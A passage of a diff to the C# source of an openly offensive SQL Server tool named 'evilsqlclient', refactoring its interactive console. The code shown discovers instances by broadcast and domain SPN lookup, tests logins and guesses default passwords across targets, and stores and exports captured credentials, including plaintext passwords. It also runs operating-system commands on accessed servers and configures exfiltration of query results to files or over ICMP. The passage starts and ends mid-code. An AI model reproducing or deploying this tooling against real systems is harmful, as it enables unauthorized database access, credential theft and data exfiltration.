+                }
+            }
+
             // ------------------------------------------------------------
             // FUNCTION: LISTLOGINS
             // ------------------------------------------------------------	
-            public static string ListLogins()
+            public string ListLogins()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -1741,7 +1959,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1759,19 +1977,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: CHECKACCESS 
             // ------------------------------------------------------------
-            public static string CheckAccess()
+            public string CheckAccess()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
-                        foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
+                        foreach (DataRow CurrentRecord in MasterDiscoveredList.Select())
                         {
                             TargetList.Add(CurrentRecord["Instance"].ToString());
                         }
@@ -1784,7 +2002,7 @@ namespace evilsqlclient
                     }
 
                     // Get list count
-                    var count = EvilCommands.MasterDiscoveredList.Rows.Count;
+                    var count = MasterDiscoveredList.Rows.Count;
                     int countAccessible = 0;
                     Console.WriteLine("\n" + count + " instances will be targeted.");
 
@@ -1894,7 +2112,7 @@ namespace evilsqlclient
                                 Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());
 
                                 // Add to access list								
-                                EvilCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), PasswordG);
+                                MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), PasswordG);
 
                                 // Add to count
                                 countAccessible = countAccessible + 1;
@@ -1903,7 +2121,7 @@ namespace evilsqlclient
                         catch (SqlException ex)
                         {
                             Console.WriteLine("" + instance + ": CONNECTION OR QUERY FAILED");
-                            if (VerboseG.Equals("enabled"))
+                            if (VerboseG)
                             {
                                 Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                             }
@@ -1921,19 +2139,19 @@ namespace evilsqlclient
             // ------------------------------------------------------------
             // FUNCTION: CHECKDEFAULTAPPPW 
             // ------------------------------------------------------------
-            public static string CheckDefaultAppPw()
+            public void CheckDefaultAppPw()
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create list 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/									   
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
-                        foreach (DataRow CurrentRecord in EvilCommands.MasterDiscoveredList.Select())
+                        foreach (DataRow CurrentRecord in MasterDiscoveredList.Select())
                         {
                             TargetList.Add(CurrentRecord["Instance"].ToString());
                         }
@@ -2053,7 +2271,7 @@ namespace evilsqlclient
                                     try
                                     {
                                         // Setup connection string
-                                        string ConnectionString = CreateConnectionString(instance, DefaultUsername, DefaultPassword, "SqlLogin", "master");
+                                        string ConnectionString = CreateConnectionString(instance, DefaultUsername, DefaultPassword, UserType.SqlLogin, "master");
 
                                         // Execute query							
                                         string fullcommand = @"
@@ -2153,7 +2371,7 @@ namespace evilsqlclient
                                             Console.WriteLine("Login is Sysadmin    : " + CurrentRecord["IsSysadmin"].ToString());
 
                                             // Add to access list
-                                            EvilCommands.MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), DefaultPassword);
+                                            MasterAccessList.Rows.Add(CurrentRecord["Instance"].ToString(), CurrentRecord["DomainName"].ToString(), CurrentRecord["ServiceProcessID"].ToString(), CurrentRecord["ServiceName"].ToString(), CurrentRecord["ServiceAccount"].ToString(), CurrentRecord["AuthenticationMode"].ToString(), CurrentRecord["ForcedEncryption"].ToString(), CurrentRecord["Clustered"].ToString(), CurrentRecord["SQLServerMajorVersion"].ToString(), CurrentRecord["SQLServerVersionNumber"].ToString(), CurrentRecord["SQLServerEdition"].ToString(), CurrentRecord["SQLServerServicePack"].ToString(), CurrentRecord["OSArchitecture"].ToString(), CurrentRecord["OsVersionNumber"].ToString(), CurrentRecord["CurrentLogin"].ToString(), CurrentRecord["IsSysadmin"].ToString(), DefaultPassword);
 
                                             // Add to passwords found count 
                                             guessCount = guessCount + 1;
@@ -2162,7 +2380,7 @@ namespace evilsqlclient
                                     catch (SqlException ex)
                                     {
                                         Console.WriteLine("" + instance + ": LOGIN, CONNECITON, or QUERY FAILED");
-                                        if (VerboseG.Equals("enabled"))
+                                        if (VerboseG)
                                         {
                                             Console.WriteLine("\n" + ex.Errors[0].Message + "\n");
                                         }
@@ -2177,25 +2395,24 @@ namespace evilsqlclient
                 {
                     Console.WriteLine("\nNo target instances have been defined.");
                 }
-                return null;
             }
 
             // ------------------------------------------------------------
             // FUNCTION: RUNOSCMD
             // ------------------------------------------------------------
-            public static string RunOsCmd(string command)
+            public string RunOsCmd(string command)
             {
                 CheckQueryReady();
-                if (ReadyforQueryG.Equals("yes"))
+                if (ReadyforQueryG)
                 {
                     // Create data table 
                     IList<string> TargetList = new List<string>();
 
                     // Add all
                     // https://www.c-sharpcorner.com/UploadFile/0f68f2/querying-a-data-table-using-select-method-and-lambda-express/	
-                    DataView AccessView = new DataView(EvilCommands.MasterAccessList);
+                    DataView AccessView = new DataView(MasterAccessList);
                     DataTable distinctValues = AccessView.ToTable(true, "Instance");
-                    if (InstanceAllG.Equals("enabled"))
+                    if (InstanceAllG)
                     {
                         foreach (DataRow CurrentRecord in distinctValues.Select())
                         {
@@ -2342,59 +2559,82 @@ namespace evilsqlclient
             // --------------------------------
             //  FUNCTION: CheckQueryReady
             // --------------------------------
-            public static string CheckQueryReady()
+            public string CheckQueryReady()
             {
                 // Verify query targets have been defined
-                if ((!InstanceG.Equals("")) || (!ConnectionStringG.Equals("")) || (!InstanceAllG.Equals("disabled")))
+                if ((!ConnectionStringG.Equals("")) || InstanceAllG)
                 {
-                    ReadyforQueryG = "yes";
+                    ReadyforQueryG = true;
                 }
 
                 return null;
             }
 
+            /// <summary>
+            /// Opens a connection to the database and handles all relevent exeptions
+            /// </summary>
+            /// <param name="conn"></param>
+            /// <param name="instance"></param>
+            /// <returns></returns>
+            public bool OpenConnection(SqlConnection conn, string instance)
+            {
+                try
+                {
+                    conn.Open();
+                    return true;
+                }
+                catch (Exception ex)
+                {
+                    if (ex is InvalidOperationException)
+                    {
+                        Console.WriteLine($"{instance}: DATA SOURCE / SERVER WAS NOT SPECIFIED OR IS ALREADY OPEN");
+                    }
+                    else if (ex is SqlException)
+                    {
+                        var sqlex = ex as SqlException;
+                        if (18487 == sqlex.Number || 18488 == sqlex.Number)
+                        {
+                            Console.WriteLine($"{instance}: PASSWORD EXPIRED OR MUST BE RESET");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"{instance}: CONNECTION FAILED");
+                        }
+                    }
+
+                    if (VerboseG)
+                    {
+                        Console.WriteLine();
+                        Console.WriteLine(ex.Message);
+                    }
+
+                    return false;
+                }
+            }
+
             // --------------------------------
             // FUNCTION: CreateConnectionString
             // --------------------------------
-            public static string CreateConnectionString(string instance, string username, string password, string usertype, string database)
+            private string CreateConnectionString(string instance, string username, string password, UserType usertype, string database)
             {
-                // Seting empty connection string 
-                string connectionString = "";
-
-                // Create current Windows user 
-                if (usertype.Equals("CurrentWindowsUser"))
+                return usertype switch
                 {
-                    connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=" + TimeOutG + ";";
-                }
-
-                // Create Windows Domain user string
-                if (usertype.Equals("WindowsDomainUser"))
-                {
-                    // connectionString = "Server=" + instance + ";Database=" + database + ";Integrated Security=SSPI;Connection Timeout=1" + TimeOutG + ";uid=" + username + ";pwd=" + password + ";";
-                    connectionString = "Server=" + instance + ";Database=" + database + ";Persist Security Info=True;Connection Timeout=1" + TimeOutG + ";uid=" + username + ";pwd=" + password + ";";
-                }
-
-                // Create SQL Login string
-                if (usertype.Equals("SqlLogin"))
-                {
-                    connectionString = "Server=" + instance + ";Database=" + database + ";Connection Timeout=" + TimeOutG + ";User ID=" + username + ";pwd=" + password + ";";
-                }
-
-                return connectionString;
+                    UserType.CurrentWindowsUser => $"Server={instance};Database={database};Integrated Security=SSPI;Connection Timeout={TimeOutG};",
+                    UserType.WindowsDomainUser =>  $"Server={instance};Database={database};Persist Security Info=True;Connection Timeout={TimeOutG};uid={username};pwd={password};",
+                    UserType.SqlLogin =>           $"Server={instance};Database={database};Connection Timeout={TimeOutG};User ID={username};pwd={password};",
+                    _ => throw new InvalidDataException()
+                };
             }
-
-
             #endregion commonfunctions
 
             // --------------------------------
             // FUNCTION: RunConsole / Query 
             // --------------------------------
-            public static string RunSQLConsole()
+            public bool RunSQLConsole(string[] commandFromCommandLine)
             {
-
                 // Setup columns for discovery table
                 if (MasterDiscoveredList.Columns.Count == 0)
-                {                    
+                {
                     MasterDiscoveredList.Columns.Add("Instance");
                     MasterDiscoveredList.Columns.Add("SamAccountName");
                 }
@@ -2421,237 +2661,177 @@ namespace evilsqlclient
                     MasterAccessList.Columns.Add("CurrentLoginPassword");
                 }
 
-                // Read line from the client	
-                Console.Write("SQLCLIENT> ");
-                String MyQuery = Console.ReadLine().ToString();
+                // Collect multi-line command until "go" is given         
+                string MyQuery = string.Empty;
+                string fullcommand = string.Empty;
 
-                // Collect multi-line command until "go" is given
-                string fullcommand = "";
-                while (MyQuery.ToLower() != "go")
+                bool multiline = true;
+
+                int i = 0;
+                do
                 {
+                    // Show multi-line input											
+                    if (!multiline)
+                    {
+                        Console.Write("         > ");
+                    }
+                    else
+                    {
+                        Console.Write("SQLCLIENT> ");
+                    }
+
+                    if (null == commandFromCommandLine)
+                    {
+                        MyQuery = Console.ReadLine();
+                    }
+                    else
+                    {
+                        if (commandFromCommandLine.Length > i)
+                        {
+                            MyQuery = commandFromCommandLine[i++];
+                            Console.WriteLine(MyQuery);
+                        }
+                        else
+                        {
+                            break;
+                        }
+                    }
+
                     fullcommand = fullcommand + "\n" + MyQuery;
 
                     // EXIT IF REQUESTED
-                    if (MyQuery.ToLower().Equals("exit") || MyQuery.ToLower().Equals("quit") || MyQuery.ToLower().Equals("bye"))
+                    if (MyQuery.Equals("exit", StringComparison.OrdinalIgnoreCase)
+                        || MyQuery.Equals("quit", StringComparison.OrdinalIgnoreCase)
+                        || MyQuery.Equals("bye", StringComparison.OrdinalIgnoreCase)
+                    )
                     {
-                        return null;
+                        Environment.Exit(0);
                     }
 
                     // ----------------------------------------------------
                     // CONNECTION SETTINGS 
                     // ----------------------------------------------------
                     #region connection settings
-
-                    // SET CUSTOM CONNECTION STRING  
-                    bool loadCheck = MyQuery.ToLower().Contains("set connstring ");
-                    if (loadCheck)
+                    if (multiline = MyQuery.Check("set connstring "))
                     {
-                        string newcon = MyQuery.Replace("set connstring ", "");
-                        ConnectionStringG = newcon;
+                        ConnectionStringG = MyQuery.Replace("set connstring ", string.Empty);
 
                         // Unset other connection settings 
-                        InstanceAllG = "n";
-                        InstanceG = "";
-                        UsernameG = "";
-                        UsertypeG = "";
-                        PasswordG = "";
+                        InstanceAllG = false;
+                        InstanceG = string.Empty;
+                        UsernameG = string.Empty;
+                        UsertypeG = UserType.CurrentWindowsUser;
+                        PasswordG = string.Empty;
 
-                        // Parse connection string and populate settings
-                        // tbd 
-
-                        // Status user
-                        Console.Write("\nConnection string set to: " + newcon + "\n");
+                        Console.WriteLine($"\nConnection string set to: {ConnectionStringG}");
                         fullcommand = "";
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // SET SINGLE INSTANCE
-                    bool instanceCheck = MyQuery.ToLower().Contains("set instance ");
-                    if (instanceCheck)
+                    else if (multiline = MyQuery.Check("set instance "))
                     {
+                        InstanceG = MyQuery.Replace("set instance ", "");
+                        Console.WriteLine($"\nTarget instance set to: {InstanceG}");
 
-                        // Configure instance 
-                        string newinstance = MyQuery.Replace("set instance ", "");
-                        InstanceG = newinstance;
-                        Console.Write("\nTarget instance set to: " + InstanceG + "\n");
-
-                        // Update connectionstring
                         ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
-
-                        // Add instance to discovered list
-                        EvilCommands.MasterDiscoveredList.Rows.Add(InstanceG);
-
-                        // Unset InstanceAllG
-                        InstanceAllG = "disabled";
-
-                        // Status user
-                        Console.Write("\nSQLCLIENT> ");
+                        MasterDiscoveredList.Rows.Add(InstanceG);
+                        InstanceAllG = false;
                     }
-
-                    // SET ALL DISCOVERED INSTANCES
-                    bool instanceallCheck = MyQuery.ToLower().Contains("set targetall ");
-                    if (instanceallCheck)
+                    else if (multiline = MyQuery.Check("set targetall "))
                     {
-                        string instancestate = MyQuery.Replace("set targetall ", "");
-                        if ((instancestate.Equals("enabled")) || (instancestate.Equals("disabled")))
-                        {
-                            InstanceAllG = instancestate;
-                            InstanceG = "";
-                            if (instancestate.Equals("enabled"))
-                            {
-                                Console.Write("\nEnabled targeting of all discovered instances.\n");
-                            }
-                            else
-                            {
-                                Console.Write("\nDisabled targeting of all discovered instances.\n");
-                            }
-
-                            // Update connectionstring
-                            ConnectionStringG = "";
-
-                        }
-                        else
-                        {
-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-
-                        Console.Write("\nSQLCLIENT> ");
+                        InstanceAllG = MyQuery.EnableDisable("set targetall ");
+                        Console.WriteLine($"\n{(InstanceAllG ? "Enabled targeting of all discovered instances." : "Disabled targeting of all discovered instances")}");
+                        ConnectionStringG = string.Empty;
+                        InstanceG = string.Empty;
                     }
-
-                    // SET USERNAME
-                    bool usernameCheck = MyQuery.ToLower().Contains("set username ");
-                    if (usernameCheck)
+                    else if (multiline = MyQuery.Check("set username "))
                     {
-                        // Set username	
                         UsernameG = MyQuery.ToLower().Replace("set username ", "");
-                        Console.Write("\nUsername set to: " + UsernameG + "\n");
+                        Console.WriteLine($"\nUsername set to: {UsernameG}");
 
-                        // Update user type Domain or SQL 						
-                        if (UsernameG.ToLower().Contains("\\"))
+                        if (string.IsNullOrEmpty(UsernameG))
                         {
-                            UsertypeG = "WindowsDomainUser";
+                            // Set to current windows users if blank
+                            UsertypeG = UserType.CurrentWindowsUser;
+                        }
+                        else if (UsernameG.ToLower().Contains("\\"))
+                        {
+                            // Update user type Domain or SQL 						
+                            UsertypeG = UserType.WindowsDomainUser;
                         }
                         else
                         {
-                            UsertypeG = "SqlLogin";
+                            UsertypeG = UserType.SqlLogin;
                         }
 
-                        // Set to current windows users if blank
-                        if (UsernameG.Equals(""))
-                        {
-                            UsertypeG = "CurrentWindowsUser";
-                        }
-
-                        // Update connectionstring
                         ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
-
-                        // Return to console 
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // SET PASSWORD
-                    bool passwordCheck = MyQuery.Contains("set password ");
-                    if (passwordCheck)
+                    else if (multiline = MyQuery.Check("set password "))
                     {
-
-                        // Set password 
                         PasswordG = MyQuery.Replace("set password ", "");
-                        Console.Write("\nPassword set to: " + PasswordG + "\n");
+                        Console.WriteLine($"\nPassword set to: {PasswordG}");
 
-                        // Update connectionstring
                         ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
-
-                        // Return to console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // SET QUERY TIMEOUT
-                    bool timeoutCheck = MyQuery.Contains("set timeout ");
-                    if (timeoutCheck)
+                    else if (multiline = MyQuery.Check("set passlist "))
                     {
-                        // Set timeout
-                        TimeOutG = MyQuery.ToLower().Replace("set timeout ", "");
-                        Console.Write("\nQuery timeout set to: " + TimeOutG + "\n");
-
-                        // Update connectionstring
-                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
-
-                        // Return to console
-                        Console.Write("\nSQLCLIENT> ");
+                        PassList = MyQuery.Replace("set passlist ", "").Split(new string[] { "," }, StringSplitOptions.RemoveEmptyEntries);
+                        Console.WriteLine($"\nPassword List set to: {PassList.Length} entries");
                     }
+                    else if (multiline = MyQuery.Check("set timeout "))
+                    {
+                        TimeOutG = MyQuery.ToLower().Replace("set timeout ", string.Empty);
+                        Console.WriteLine($"\nQuery timeout set to: {TimeOutG}");
 
+                        ConnectionStringG = CreateConnectionString(InstanceG, UsernameG, PasswordG, UsertypeG, "master");
+                    }
                     #endregion
 
                     // ----------------------------------------------------
                     // INSTANCE DISCOVERY COMMANDS
                     // ----------------------------------------------------	
                     #region discovery commands				
-
-                    // DISCOVER SQL SERVER INSTANCES VIA BROADCAST REQUEST
-                    bool broadcastCheck = MyQuery.ToLower().Contains("discover broadcast");
-                    if (broadcastCheck)
+                    else if (multiline = MyQuery.Check("discover broadcast"))
                     {
-                        // Call function
                         GetSQLServersBroadCast();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // DISCOVER SQL SERVER INSTANCES VIA SERVICE PRINCIPCAL NAMES
-                    bool spnCheck = MyQuery.ToLower().Contains("discover domainspn");
-                    if (spnCheck)
+                    else if (multiline = MyQuery.Check("discover domainspn"))
                     {
-                        // Call function
                         GetSQLServersSpn();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // DISCOVER SQL SERVER INSTANCES VIA PROVIDED FILE
-                    bool fileCheck1 = MyQuery.ToLower().Contains("discover file");
-                    if (fileCheck1)
+                    else if (multiline = MyQuery.Check("discover file"))
                     {
-                        // Parse file path
-                        String filePath1 = MyQuery.ToLower();
-                        String parts = filePath1.Split(' ')[2];
+                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
 
-                        // Add instance list to discovered
+                        string parts = string.Empty;
+                        if (filePath1.Length > 2)
+                        {
+                            parts = filePath1[2];
+                        }
+
                         GetSQLServerFile(parts);
-
-                        // Display Console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // SHOW DISCOVERED SQL SERVER INSTANCES
-                    bool showdiscoCheck = MyQuery.ToLower().Contains("show discovered");
-                    if (showdiscoCheck)
+                    else if (multiline = MyQuery.Check("show discovered"))
                     {
-                        // Call function
                         ShowDiscovered();
-
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // EXPORT DISCOVERED SQL SERVER INSTANCES TO FILE
-                    bool exportdiscoCheck = MyQuery.ToLower().Contains("export discovered");
-                    if (exportdiscoCheck)
+                    else if (multiline = MyQuery.Check("export discovered"))
                     {
-                        // Parse file path
-                        String filePath1 = MyQuery.ToLower();
-                        String targetPath = filePath1.Split(' ')[2];
+                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+
+                        string targetPath = string.Empty;
+                        if (filePath1.Length > 2)
+                        {
+                            targetPath = filePath1[2];
+                        }
 
                         StringBuilder fileContent = new StringBuilder();
 
-                        foreach (var col in EvilCommands.MasterDiscoveredList.Columns)
+                        foreach (var col in MasterDiscoveredList.Columns)
                         {
                             fileContent.Append(col.ToString() + ",");
                         }
 
-                        fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
-                        foreach (DataRow dr in EvilCommands.MasterDiscoveredList.Rows)
+                        fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
+                        foreach (DataRow dr in MasterDiscoveredList.Rows)
                         {
                             foreach (var column in dr.ItemArray)
                             {
@@ -2664,67 +2844,66 @@ namespace evilsqlclient
                         try
                         {
                             // write file output
-                            System.IO.File.WriteAllText(targetPath, fileContent.ToString());
-                            Console.WriteLine("\n" + EvilCommands.MasterDiscoveredList.Rows.Count + " instances were written to " + targetPath);
+                            File.WriteAllText(targetPath, fileContent.ToString());
+                            Console.WriteLine("\n" + MasterDiscoveredList.Rows.Count + " instances were written to " + targetPath);
                         }
                         catch
                         {
                             Console.WriteLine("\nUnable to write file.\n");
                         }
-
-                        // Display console	
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // CLEAR DISCOVERED INSTANCES 
-                    bool cleardiscoCheck = MyQuery.ToLower().Contains("clear discovered");
-                    if (cleardiscoCheck)
+                    else if (multiline = MyQuery.Check("clear discovered"))
                     {
-                        // Remove items
-                        EvilCommands.MasterDiscoveredList.Clear();
-
-                        // Status user
+                        MasterDiscoveredList.Clear();
                         Console.Write("\nThe list of discovered instances has been cleared.\n");
-
-                        // Display console				
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // SHOW SQL SERVER INSTANCES THAT CAN BE LOGGED INTO
-                    bool showaccessCheck = MyQuery.ToLower().Contains("show access");
-                    if (showaccessCheck)
+                    else if (multiline = MyQuery.Check("show access"))
                     {
-                        //Call function
-                        ShowAccess(); 
-                        
-                        // Display console
-                        Console.Write("\nSQLCLIENT> ");
+                        ShowAccess();
                     }
-
-                    // EXPORT SQL SERVER INSTANCES THAT CAN BE LOGGED INTO TO FILE
-                    bool exportaccessCheck = MyQuery.ToLower().Contains("export access");
-                    if (exportaccessCheck)
+                    else if (multiline = MyQuery.Check("export access"))
                     {
-                        // Parse file path
-                        String filePath1 = MyQuery.ToLower();
-                        String targetPath = filePath1.Split(' ')[2];
-                        String InstanceOnly = "";
-                        try
+
+                        string[] filePath1 = MyQuery.ToLower().Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries);
+
+                        string targetPath = string.Empty;
+                        if (filePath1.Length > 2)
                         {
-                            InstanceOnly = filePath1.Split(' ')[3];
+                            targetPath = filePath1[2];
                         }
-                        catch
+
+                        string InstanceOnly = string.Empty;
+                        if (filePath1.Length > 3)
                         {
-                            InstanceOnly = "";
+                            InstanceOnly = filePath1[3];
                         }
 
                         // Unique the list
-                        DataView AccessView = new DataView(EvilCommands.MasterAccessList);
-                        DataTable distinctValues = AccessView.ToTable(true, "Instance", "DomainName", "ServiceProcessID", "ServiceName", "ServiceAccount", "AuthenticationMode", "ForcedEncryption", "Clustered", "SQLServerMajorVersion", "SQLServerVersionNumber", "SQLServerEdition", "SQLServerServicePack", "OSArchitecture", "OsVersionNumber", "CurrentLogin", "CurrentLoginPassword", "IsSysadmin");
+                        DataView AccessView = new DataView(MasterAccessList);
+                        DataTable distinctValues = AccessView.ToTable(
+                            true,
+                            "Instance",
+                            "DomainName",
+                            "ServiceProcessID",
+                            "ServiceName",
+                            "ServiceAccount",
+                            "AuthenticationMode",
+                            "ForcedEncryption",
+                            "Clustered",
+                            "SQLServerMajorVersion",
+                            "SQLServerVersionNumber",
+                            "SQLServerEdition",
+                            "SQLServerServicePack",
+                            "OSArchitecture",
+                            "OsVersionNumber",
+                            "CurrentLogin",
+                            "CurrentLoginPassword",
+                            "IsSysadmin"
+                        );
 
                         StringBuilder fileContent = new StringBuilder();
 
-                        if (InstanceOnly.Equals(""))
+                        if (InstanceOnly.Equals(string.Empty))
                         {
                             // Write headers
                             foreach (var col in distinctValues.Columns)
@@ -2733,7 +2912,7 @@ namespace evilsqlclient
                             }
 
                             // Write Data 
-                            fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                            fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                             foreach (DataRow dr in distinctValues.Rows)
                             {
                                 foreach (var column in dr.ItemArray)
@@ -2741,7 +2920,7 @@ namespace evilsqlclient
                                     fileContent.Append("\"" + column.ToString() + "\",");
                                 }
 
-                                fileContent.Replace(",", System.Environment.NewLine, fileContent.Length - 1, 1);
+                                fileContent.Replace(",", Environment.NewLine, fileContent.Length - 1, 1);
                             }
                         }
 
@@ -2757,349 +2936,152 @@ namespace evilsqlclient
                         try
                         {
                             // write file output
-                            System.IO.File.WriteAllText(targetPath, fileContent.ToString());
-                            Console.WriteLine("\n" + EvilCommands.MasterAccessList.Rows.Count + " instances were written to " + targetPath);
+                            File.WriteAllText(targetPath, fileContent.ToString());
+                            Console.WriteLine("\n" + MasterAccessList.Rows.Count + " instances were written to " + targetPath);
                         }
                         catch
                         {
                             Console.WriteLine("\nUnable to write file.\n");
                         }
-
-                        // Display console	
-                        Console.Write("\nSQLCLIENT> ");
                     }
-
-                    // CLEAR DISCOVERED INSTANCES 
-                    bool clearaccessCheck = MyQuery.ToLower().Contains("clear access");
-                    if (clearaccessCheck)
+                    else if (multiline = MyQuery.Check("clear access"))
                     {
-                        // Remove items
-                        EvilCommands.MasterAccessList.Clear();
-
-                        // Status user
-                        Console.Write("\nThe list of instances that can be logged into has been cleared.\n");
-
-                        // Display console				
-                        Console.Write("\nSQLCLIENT> ");
+                        MasterAccessList.Clear();
+                        Console.WriteLine("\nThe list of instances that can be logged into has been cleared.");
                     }
-
                     #endregion
 
                     // ----------------------------------------------------
                     // DATA EXFILTRATION SETTINGS 
                     // ----------------------------------------------------
                     #region data exfiltration settings 
-
-                    // FILE EXFILTRATION: ENABLE/DISABLE
-                    bool fileCheck3 = MyQuery.ToLower().Contains("set file ");
-                    if (fileCheck3)
+                    else if (multiline = MyQuery.Check("set file "))
                     {
-                        string filestate = MyQuery.Replace("set file ", "");
-                        if ((filestate.Equals("enabled")) || (filestate.Equals("disabled")))
-                        {
-                            ExportFileStateG = filestate;
-                            Console.Write("\nExfiltrating query results to a file has been " + filestate + ".\n");
-                            Console.Write("Don't forget to set the filepath setting.\n");
-                        }
-                        else
-                        {
-                            Console.Write("\nValid settings include enabled or disabled.\n");
-                        }
-                        Console.Write("\nSQLCLIENT> ");
+                        ExportFileStateG = MyQuery.EnableDisable("set file ");
+                        Console.WriteLine($"\nExfiltrating query results to a file has been {(ExportFileStateG ? "enabled\nDon't forget to set the filepath setting." : "disabled")} ");
                     }
-
-                    // FILE EXFILTRATION: SET OUTPUT FILE
-                    bool fileCheck = MyQuery.ToLower().Contains("set filepath ");
-                    if (fileCheck)
+                    else if (multiline = MyQuery.Check("set filepath "))
                     {
-                        string newfile = MyQuery.ToLower().Replace("set filepath ", "");
-                        Console.Write("\nQuery results will be exported to " + newfile + ".\n");
-                        ExportFilePathG = newfile;
-                        Console.Write("\nSQLCLIENT> ");
+                        ExportFilePathG = MyQuery.ToLower().Replace("set filepath ", "");
+                        Console.WriteLine($"\nQuery results will be exported to {ExportFilePathG}.");
                     }
-
-                    // ICMP EXFILTRATION: ENABLE/DISABLE
-                    bool icmpenabledCheck = MyQuery.ToLower().Contains("set icmp ");
-                    if (icmpenabledCheck)
+                    else if (multiline = MyQuery.Check("set icmp "))
                     {
-                        string IcmpState = MyQuery.ToLower().Replace("set icmp ", "");
-                        if ((IcmpState.Equals("enabled")) || (IcmpState.Equals("disabled")))
-                        {
-                            IcmpStateG = IcmpState;
-                            Console.Write("\nExfiltrating query results via ICMP has been " + IcmpState + ".\n");
-                            Console.Write("Don't forget to configure the ICMPIP setting.\n");
-                        }
-                        else
-                        {
